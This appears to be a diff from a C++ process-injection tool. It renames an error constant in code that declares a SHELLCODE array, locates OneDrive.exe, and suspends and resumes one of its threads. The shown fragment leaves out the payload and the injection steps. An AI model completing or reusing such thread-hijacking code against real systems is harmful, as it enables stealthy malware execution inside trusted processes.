@@ -65,7 +65,7 @@ const unsigned char SHELLCODE[] = {
 using AutoHandle = std::unique_ptr<std::remove_pointer<HANDLE>::type, decltype(&CloseHandle)>;
 
 const std::wstring ONEDRIVE = L"OneDrive.exe";
-constexpr DWORD INVALID_HANDLE = (DWORD)-1;
+constexpr DWORD INVALID_RETURN = (DWORD)-1;
 
 
 // Returning ProcessEntry32 Structure of OneDrive.exe
@@ -133,7 +133,7 @@ int main() {
             return 1;
         }
 
-        if (INVALID_HANDLE == SuspendThread(hThread.get())) {
+        if (INVALID_RETURN == SuspendThread(hThread.get())) {
             std::cerr << "Failed to suspend the thread " << GetLastError() << std::endl;
             return 1;
         }
@@ -170,7 +170,7 @@ int main() {
             return 1;
         }
 
-        if (INVALID_HANDLE == ResumeThread(hThread.get())) {
+        if (INVALID_RETURN == ResumeThread(hThread.get())) {
             std::cerr << "Failed to resume the thread " << GetLastError() << std::endl;
             return 1;
         }
